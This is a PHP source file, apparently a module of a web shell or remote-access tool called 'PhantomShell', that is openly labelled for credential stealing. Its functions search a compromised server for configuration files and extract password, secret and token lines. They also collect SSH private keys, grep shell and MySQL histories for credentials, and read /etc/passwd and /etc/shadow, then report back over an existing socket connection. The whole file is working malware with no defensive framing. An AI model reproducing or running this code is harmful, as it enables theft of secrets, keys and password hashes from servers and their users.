<?php
// PhantomShell Module: Credential Stealing
// Load via MINIMAL mode: fetch stealing

function mod_steal_configs() {
    $results = array();
    $patterns = array('.env', 'wp-config.php', 'config.php', 'settings.inc.php',
        'database.yml', 'application.properties', 'web.config', 'appsettings.json');
    foreach ($patterns as $pat) {
        $cmd = "find / -maxdepth 5 -name " . escapeshellarg($pat) . " -readable -type f 2>/dev/null";
        $o = '';
        if(function_exists('shell_exec')) $o = (string)@shell_exec($cmd);
        foreach (array_filter(explode("\n", trim($o))) as $f) {
            $c = @file_get_contents($f);
            if (!$c) continue;
            $secrets = array();
            foreach (explode("\n", $c) as $l) {
                if (preg_match('/(pass|secret|key|token|db_|database|api_key)/i', $l))
                    $secrets[] = trim($l);
            }
            if ($secrets) $results[$f] = $secrets;
        }
    }
    return $results;
}

function mod_steal_ssh_keys() {
    $keys = array();
    $cmd = 'find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null';
    $o = '';
    if(function_exists('shell_exec')) $o = (string)@shell_exec($cmd);
    foreach (array_filter(explode("\n", trim($o))) as $k) {
        $c = @file_get_contents($k);
        if ($c) $keys[$k] = $c;
    }
    return $keys;
}

function mod_steal_history() {
    $findings = array();
    $cmd = 'find /home /root -maxdepth 2 \( -name ".bash_history" -o -name ".zsh_history" -o -name ".mysql_history" \) -readable 2>/dev/null';
    $o = '';
    if(function_exists('shell_exec')) $o = (string)@shell_exec($cmd);
    foreach (array_filter(explode("\n", trim($o))) as $f) {
        $c = @file_get_contents($f);
        if (!$c) continue;
        foreach (explode("\n", $c) as $l) {
            if (preg_match('/(password|passwd|ssh|curl.*-u|mysql.*-p|wget.*--password)/i', $l))
                $findings[] = "$f: $l";
        }
    }
    return $findings;
}

function mod_steal_etc() {
    $data = array();
    $c = @file_get_contents('/etc/passwd');
    if ($c) {
        $data['passwd'] = array();
        foreach (explode("\n", $c) as $l) {
            if (preg_match('/:0:/', $l) || preg_match('/sh$/', $l))
                $data['passwd'][] = $l;
        }
    }
    $c = @file_get_contents('/etc/shadow');
    if ($c) {
        $data['shadow'] = array();
        foreach (explode("\n", $c) as $l) {
            if ($l && !preg_match('/:\*:|:!:/', $l))
                $data['shadow'][] = $l;
        }
    }
    return $data;
}

if (isset($sock)) {
    @fwrite($sock, "  Stealing module loaded.\n");
    @fwrite($sock, "  Functions: mod_steal_configs, mod_steal_ssh_keys, mod_steal_history, mod_steal_etc\n");
}
?>
